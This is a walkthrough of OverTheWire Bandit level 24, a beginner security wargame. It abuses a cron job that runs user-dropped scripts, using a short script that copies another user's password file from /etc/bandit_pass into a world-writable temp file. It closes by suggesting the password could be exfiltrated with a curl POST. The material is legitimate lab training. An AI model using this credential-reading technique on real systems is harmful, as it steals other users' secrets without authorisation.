# OverTheWire - Bandit - Level 24

[OverTheWire](https://overthewire.org) offers a series of "wargames" that teach
security skills. From their website:

> The Bandit wargame is aimed at absolute beginners. It will teach the basics
> needed to be able to play other wargames.

## Challenge Overview

The goal of this challenge is to find a process that is being run by the
`cron` daemon.

Then use `ssh` to log into the server as the `bandit24` user.

## Commands Used to Solve This Challenge

- `cat`: concatenate files and print on the standard output
- `ls`: list directory contents
- `ssh`: OpenSSH remote login client

## Initial Analysis

This is similar to the last challenge and comes as no surprise after seeing the
contents of `/etc/cron.d`. The notes for this challenge say that a shell script
needs to be written - things are getting interesting.

The information from the previous challenge is used to `ssh` into the server.

## Understanding the Challenge

The `cron` daemon is used to schedule commands to be run on the server, such as
taking a backup or doing daily restarts of a process. Writing a shell script to
solve this will be a big learning curve.

## Approach Strategy

1. Log in using `ssh`
1. Use `ls` to see what is in `/etc/cron.d`
1. Use `cat` to display what is hopefully an obvious file

## Step-by-Step Solution

The login information from the previous challenge is used to get a shell as user
`bandit23`. The `ls` command is used to get the contents of `/etc/cron.d`.

```
bandit23@bandit:~$ ls -l /etc/cron.d
total 24
-rw-r--r-- 1 root root 120 Sep 19  2024 cronjob_bandit22
-rw-r--r-- 1 root root 122 Sep 19  2024 cronjob_bandit23
-rw-r--r-- 1 root root 120 Sep 19  2024 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-rwx------ 1 root root  52 Sep 19  2024 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
bandit23@bandit:~$
```

It's probably not too hard to guess that the cron job is called
`cronjob_bandit24`. Next step is to see what it does:

```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$
```

So this says that when the cron job runs, it runs the command
`/usr/bin/cronjob_bandit24.sh`. The `@reboot` means that the job is run when
the server is rebooted. The `* * * * *` means that the job runs every minute, of
every hour, of every day of the month, of every month of the year, and every
day of the week. Where it says `bandit24` is the user that the cron job is to
run as.

The next step is to see what the command actually does:

```
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$
```

This is definitely more complicated than the previous challenges.

- The `/var/spool` directory is a temporary holding area for items to be
  processed
- This command is using `/var/spool/bandit24/foo` to hold files
- It does a loop over every file other than `.` and `..` to
  - Check that the owner is `bandit23`
  - If so then run the command, but if it runs more than `60` seconds then stop
    (`-s`) the process with a `-9` (KILL) signal
  - Delete the file

### The Script

It seems that what is needed is to write a script to copy the password to a
place that can be read. The hardest part here is going to be learning how to
edit files, and be warned that learning `vi` is beyond this walkthough!

It will be good to have a working directory to store the script while it is
being written and tested. Create a temporary directory and `cd` (change
directory) into it:

```
bandit23@bandit:~$ mktemp -d
/tmp/tmp.hNMIWeUFng
bandit23@bandit:~$ cd /tmp/tmp.hNMIWeUFng
bandit23@bandit:/tmp/tmp.hNMIWeUFng$
```

Then create a temporary file to receive the password, and make it writable by
any user:

```
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ mktemp
/tmp/tmp.BvduascluY
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ chmod 666 /tmp/tmp.BvduascluY
```

Then (magic!) use `vi` to create the script:

```
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ vi script.sh
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ cat script.sh
#!/bin/sh

cat /etc/bandit_pass/bandit24 > /tmp/tmp.BvduascluY

bandit23@bandit:/tmp/tmp.hNMIWeUFng$
```

The first line of the script defines the command that process the script. In
this case it's a plain `sh` script. The next line does a `cat` of the password
file into the world-writable temporary file.

Next, check the permissions on the script:

```
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ ls -l
total 4
-rw-rw-r-- 1 bandit23 bandit23 64 Mar 28 05:05 script.sh
bandit23@bandit:/tmp/tmp.hNMIWeUFng$
```

That's no good - it needs execute permissions, and in particular for the
`bandit24` user that will be running the command. It's best to make it runnable
by everyone:

```
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ chmod 755 script.sh
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ ls -l
total 4
-rwxr-xr-x 1 bandit23 bandit23 64 Mar 28 05:05 script.sh
bandit23@bandit:/tmp/tmp.hNMIWeUFng$
```

Next copy it into the `spool` directory:

```
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.hNMIWeUFng$
```

Now to wait for the cron job to run, which is every minute:

```
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ cat /tmp/tmp.BvduascluY
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ cat /tmp/tmp.BvduascluY
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ cat /tmp/tmp.BvduascluY
bandit23@bandit:/tmp/tmp.hNMIWeUFng$ cat /tmp/tmp.BvduascluY
[REMOVED: BANDIT24 PASSWORD]
```

To confirm that the password is correct, disconnect from the server and then
reconnect using the `bandit24` user and the found password (`/etc/issue` and
`/etc/motd` removed):

```
bandit23@bandit:~$
logout
Connection to bandit.labs.overthewire.org closed.
$ ssh bandit24@bandit.labs.overthewire.org -p 2220
[REMOVED: /etc/issue]
bandit24@bandit.labs.overthewire.org's password:
[REMOVED: /etc/motd]
bandit24@bandit:~$
```

## Key Takeaways

The ability to write shell scripts is a very important tool to have.

## Beyond the Flag

The solution above is fairly simple, all things considered. Instead of writing
the password to a file, it could be exfiltrated by using `curl` to POST it to
an API endpoint.
